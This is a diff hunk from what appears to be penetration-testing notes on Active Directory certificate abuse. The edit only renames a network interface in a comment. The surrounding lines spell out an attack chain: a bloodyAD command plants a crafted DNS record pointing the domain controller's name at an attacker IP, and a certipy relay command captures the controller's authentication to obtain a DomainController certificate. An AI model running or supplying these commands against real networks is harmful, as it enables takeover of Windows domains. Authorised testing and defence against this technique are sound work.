@@ -174,7 +174,7 @@ Any Client Authentication template works — not just explicitly vulnerable ones
 KRB5CCNAME=<TGT> bloodyAD -k -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_FQDN> add dnsRecord <DC_HOSTNAME>UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <ATTACKER_IP>
 
 # Start relay to get auth, forward to AD, and get cert
-# NOTE: Must run sudo for tcp/445 on tun0
+# NOTE: Must run sudo for tcp/445 on INTERFACE
 sudo uv run certipy relay -template DomainController -interface <ATTACKER_IP> -target 'http://<DC_FQDN>/'
 ```
 
